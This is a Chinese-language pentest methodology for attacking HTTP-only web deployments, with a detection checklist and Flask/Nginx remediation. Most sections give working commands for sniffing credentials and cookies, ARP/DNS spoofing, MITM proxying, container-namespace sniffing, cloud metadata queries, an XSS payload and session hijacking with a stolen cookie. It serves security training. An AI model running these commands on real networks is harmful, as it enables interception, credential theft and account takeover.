# HTTP-only 部署攻击方法论

## 1. 技术概述

### 1.1 漏洞原理

本方法论针对**Web 应用仅使用 HTTP 协议部署，未配置 HTTPS/TLS 加密**的安全缺陷。当应用通过未加密的 HTTP 传输敏感数据时，攻击者可通过网络嗅探、中间人攻击等方式窃取传输中的敏感信息。

**核心问题：**
- 应用未配置 TLS/SSL 证书
- 敏感数据（凭证、Cookie、API 密钥）明文传输
- 无 HTTP 到 HTTPS 的重定向
- 缺少 HSTS 头强制 HTTPS
- 同一网络段可被嗅探

### 1.2 适用范围

- 内部网络应用未配置 HTTPS
- 开发/测试环境 HTTP 部署
- CTF 挑战应用 HTTP 传输 Flag
- 容器化应用仅暴露 HTTP 端口
- 负载均衡器未终止 TLS

### 1.3 读者对象

- 渗透测试工程师
- 网络攻击评估人员
- 红队成员
- 安全审计人员

---

## 2. 风险场景

### 2.1 典型风险场景

| 场景 | 描述 | 风险等级 |
|-----|------|---------|
| **凭证窃听** | 登录凭证明文传输 | 严重 |
| **会话劫持** | Session Cookie 被窃取 | 严重 |
| **数据泄露** | 敏感业务数据被嗅探 | 高 |
| **中间人攻击** | 流量被篡改或注入 | 严重 |
| **Flag 拦截** | CTF Flag 明文传输 | 中（预期） |

### 2.2 网络拓扑风险

```
┌─────────────┐      ┌─────────────┐      ┌─────────────┐
│   攻击者    │──────│  共享网络   │──────│   受害者    │
│  (嗅探器)   │      │  (HTTP)     │      │  (浏览器)   │
└─────────────┘      └─────────────┘      └─────────────┘
                            │
                            ▼
                   ┌─────────────┐
                   │   目标应用  │
                   │ (HTTP only) │
                   └─────────────┘
```

**风险说明：**
- 攻击者与受害者在同一网络段（WiFi、容器网络、VPC）
- 所有流量明文传输，可被嗅探
- 攻击者可被动监听或主动注入

---

## 3. 探测与识别方法

### 3.1 协议检测

#### 3.1.1 检查 HTTPS 可用性

```bash
# 测试 HTTPS 端口
curl -I https://target
curl -I https://target:443
curl -I https://target:8443

# 使用 nmap 扫描 HTTPS 端口
nmap -sV --script ssl-enum-ciphers -p 443 target
nmap -sV --script ssl-enum-ciphers -p 8443 target

# 检查证书
openssl s_client -connect target:443
```

**无 HTTPS 特征：**
- 连接被拒绝或超时
- 端口未开放
- 无 SSL/TLS 证书

#### 3.1.2 检查 HTTP 到 HTTPS 重定向

```bash
# 检查重定向
curl -I http://target
curl -Iv http://target 2>&1 | grep -i "location\|301\|302"

# 使用 gobuster 扫描
gobuster dir -u http://target -w common-ends.txt
```

**无重定向特征：**
- 响应码为 200 OK（非 301/302）
- 无 `Location: https://` 头
- 无 `Upgrade-Insecure-Requests` 头

#### 3.1.3 检查安全头

```bash
# 完整响应头检查
curl -I http://target | grep -iE "strict-transport|upgrade-insecure|content-security"

# 检查 HSTS
curl -I http://target | grep -i "Strict-Transport-Security"
```

**缺失安全头特征：**
- 无 `Strict-Transport-Security` (HSTS)
- 无 `Content-Security-Policy`
- 无 `Upgrade-Insecure-Requests`

### 3.2 网络嗅探准备

#### 3.2.1 确认网络位置

```bash
# 检查网络接口
ip addr show
ifconfig

# 检查路由
ip route show
route -n

# 确认与目标在同一网络段
ping target
traceroute target
```

#### 3.2.2 识别目标流量

```bash
# 使用 tcpdump 监听
tcpdump -i eth0 -n host target and port 80

# 使用 tshark 分析
tshark -i eth0 -f "host target and port 80" -Y "http"
```

---

## 4. 攻击方法

### 4.1 被动嗅探攻击

#### 4.1.1 使用 tcpdump 嗅探

```bash
# 监听目标流量
tcpdump -i eth0 -n -s 0 -w capture.pcap host target and port 80

# 实时查看 HTTP 内容
tcpdump -i eth0 -n -s 0 -A host target and port 80 | grep -E "flag|secret|password|token"

# 过滤特定方法
tcpdump -i eth0 -n -s 0 -A 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)'
```

#### 4.1.2 使用 Wireshark 分析

```bash
# 捕获流量
wireshark -i eth0 -f "host target and port 80"

# 过滤 HTTP 流量
http.request.method == "POST"
http contains "flag"
http contains "password"

# 提取对象
File -> Export Objects -> HTTP
```

#### 4.1.3 使用 tshark 提取

```bash
# 捕获并过滤
tshark -i eth0 -f "host target and port 80" -Y "http.request.method == POST"

# 提取 POST 数据
tshark -i eth0 -Y "http.request.method == POST" -T fields -e http.file_data

# 提取 Cookie
tshark -i eth0 -Y "http.cookie" -T fields -e http.cookie
```

### 4.2 中间人攻击

#### 4.2.1 ARP 欺骗

```bash
# 使用 arpspoof
arpspoof -i eth0 -t target gateway
arpspoof -i eth0 -t gateway target

# 使用 bettercap
bettercap -iface eth0
> set arp.spoof.targets target
> arp.spoof on
```

**注意：** ARP 欺骗可能导致网络中断，需谨慎使用

#### 4.2.2 DNS 欺骗

```bash
# 使用 dnsspoof
dnsspoof -i eth0 -f "not port 22" target.com

# 使用 bettercap
> set dns.spoof.domains target.com
> set dns.spoof.address 192.168.1.100
> dns.spoof on
```

#### 4.2.3 使用 mitmproxy

```bash
# 启动 mitmproxy
mitmproxy --mode transparent --showhost

# 配置透明代理
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080

# 监听并记录流量
mitmdump -w capture.mitm
```

### 4.3 容器网络嗅探

#### 4.3.1 Docker 网络嗅探

```bash
# 列出 Docker 网络
docker network ls

# 检查网络类型
docker network inspect bridge

# 在容器内嗅探
docker run --net container:<target_container> --rm alpine tcpdump -i eth0 -n port 80
```

#### 4.3.2 同一 Docker 网络攻击

```bash
# 加入目标容器网络
docker run --net container:<target_container> -it alpine sh

# 嗅探流量
tcpdump -i eth0 -n -s 0 -A port 80 | grep -E "flag|secret"

# 直接访问本地服务
curl http://localhost:5000/flag
```

### 4.4 云环境攻击

#### 4.4.1 VPC 内嗅探

```bash
# 在 EC2 实例上
# 同一 VPC 内流量可被嗅探（如果安全组允许）

# 使用 tcpdump
tcpdump -i eth0 -n -s 0 -A port 80

# 使用 tshark
tshark -i eth0 -f "port 80" -Y "http"
```

#### 4.4.2 元数据服务访问

```bash
# AWS 实例元数据（如果 SSRF）
curl http://169.254.169.254/latest/meta-data/

# GCP 实例元数据
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/
```

---

## 5. 敏感信息提取

### 5.1 凭证提取

#### 5.1.1 登录凭证

```bash
# 从捕获文件中提取
tshark -r capture.pcap -Y "http.request.method == POST" -T fields -e http.file_data

# 使用 strings
strings capture.pcap | grep -i "username\|password"

# 使用 NetworkMiner
NetworkMiner capture.pcap
```

#### 5.1.2 Session Cookie

```bash
# 提取 Cookie
tshark -r capture.pcap -Y "http.cookie" -T fields -e http.cookie

# 提取 Set-Cookie
tshark -r capture.pcap -Y "http.set_cookie" -T fields -e http.set_cookie
```

### 5.2 Flag/敏感数据提取

#### 5.2.1 CTF Flag 提取

```bash
# 从 HTTP 响应提取 Flag
strings capture.pcap | grep -oE "flag\{[^}]+\}"

# 使用 tshark
tshark -r capture.pcap -Y "http" -T fields -e http.file_data | grep -oE "flag\{[^}]+\}"
```

#### 5.2.2 API 响应提取

```bash
# 提取 JSON 响应
tshark -r capture.pcap -Y "http.content_type == application/json" -T fields -e http.file_data

# 提取特定字段
tshark -r capture.pcap -Y "http" -T fields -e http.file_data | jq '.flag'
```

### 5.3 完整会话重建

```bash
# 使用 tcpflow 重建会话
tcpflow -r capture.pcap -c

# 使用 tcpxtract 提取文件
tcpxtract -f capture.pcap

# 使用 NetworkMiner 重建
NetworkMiner capture.pcap
```

---

## 6. 实战案例

### 6.1 案例：CTF Flag 拦截

**场景：**
- CTF 挑战应用运行在 `http://localhost:37575`
- 成功利用 XSS 后返回 Flag
- 应用仅 HTTP 部署

**攻击步骤：**

```bash
# 1. 启动嗅探器（后台）
tcpdump -i lo -n -s 0 -w flag_capture.pcap port 37575 &

# 2. 触发 XSS 获取 Flag
curl "http://localhost:37575/page?name=<img src=x onerror=prompt('flag')>"

# 3. 停止嗅探
pkill tcpdump

# 4. 分析捕获文件
strings flag_capture.pcap | grep -oE "flag\{[^}]+\}"
# 输出：flag{cc21e4bb-7e26-4326-ba5a-052b6b1092e1}
```

### 6.2 案例：容器网络凭证窃取

**场景：**
- 多容器 Docker 应用
- 容器间 HTTP 通信
- 数据库凭证明文传输

**攻击步骤：**

```bash
# 1. 加入目标网络
docker run --net container:app -it attacker sh

# 2. 启动嗅探
tcpdump -i eth0 -n -s 0 -A port 80 | grep -i "password"

# 3. 触发应用请求
# 等待或触发数据库操作

# 4. 提取凭证
# 从输出中获取：mysql://root:SuperSecret123@db:3306/app
```

### 6.3 案例：WiFi 网络会话劫持

**场景：**
- 公共 WiFi 网络
- 目标应用 HTTP only
- Session Cookie 明文传输

**攻击步骤：**

```bash
# 1. 监控模式
airmon-ng start wlan0

# 2. 嗅探流量
airodump-ng wlan0mon

# 3. 针对目标 AP
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF wlan0mon

# 4. 提取 Cookie
tshark -r capture.pcap -Y "http.cookie" -T fields -e http.cookie

# 5. 使用 Cookie 劫持会话
curl -b "session=stolen_session_id" http://target/admin
```

---

## 7. 检测清单

### 7.1 协议安全检查

| 检查项 | 检测方法 | 安全状态 |
|-------|---------|---------|
| HTTPS 可用 | `curl -I https://target` | 应返回 200 |
| HTTP 重定向 | `curl -I http://target` | 应 301 到 HTTPS |
| HSTS 头 | 检查响应头 | 应有 Strict-Transport-Security |
| CSP 头 | 检查响应头 | 应有 Content-Security-Policy |

### 7.2 网络嗅探检测

| 检查项 | 检测方法 | 风险指标 |
|-------|---------|---------|
| 明文 Cookie | 嗅探 Cookie 传输 | 无 Secure 标志 |
| 明文凭证 | 嗅探 POST 请求 | 无 TLS 加密 |
| 敏感数据 | 嗅探 HTTP 响应 | 明文传输 |

---

## 8. 修复建议

### 8.1 配置 HTTPS

```python
# Flask 使用 HTTPS
# 开发环境
app.run(ssl_context='adhoc')

# 生产环境（使用 Gunicorn）
gunicorn --certfile cert.pem --keyfile key.pem app:app
```

### 8.2 强制 HTTPS 重定向

```python
# Flask 强制 HTTPS
@app.before_request
def redirect_to_https():
    if not request.is_secure:
        url = request.url.replace('http://', 'https://', 1)
        return redirect(url, code=301)
```

### 8.3 配置 HSTS

```python
# Flask 添加 HSTS 头
@app.after_request
def add_security_headers(response):
    response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
    return response
```

### 8.4 Cookie 安全配置

```python
# Flask 安全 Cookie 配置
app.config.update(
    SESSION_COOKIE_SECURE=True,  # 仅 HTTPS
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SAMESITE='Lax'
)
```

### 8.5 Nginx 配置

```nginx
# HTTP 强制重定向到 HTTPS
server {
    listen 80;
    server_name example.com;
    return 301 https://$server_name$request_uri;
}

# HTTPS 配置
server {
    listen 443 ssl;
    server_name example.com;

    ssl_certificate /path/to/cert.pem;
    ssl_certificate_key /path/to/key.pem;

    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
}
```

---

## 9. 参考资源

- [OWASP Transport Layer Protection Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html)
- [OWASP Top 10:2025 A04 - Cryptographic Failures](https://owasp.org/Top10/2025/A04_2025-Cryptographic_Failures/)
- [SSL Labs Testing](https://www.ssllabs.com/ssltest/)
- [Mozilla SSL Configuration Generator](https://ssl-config.mozilla.org/)
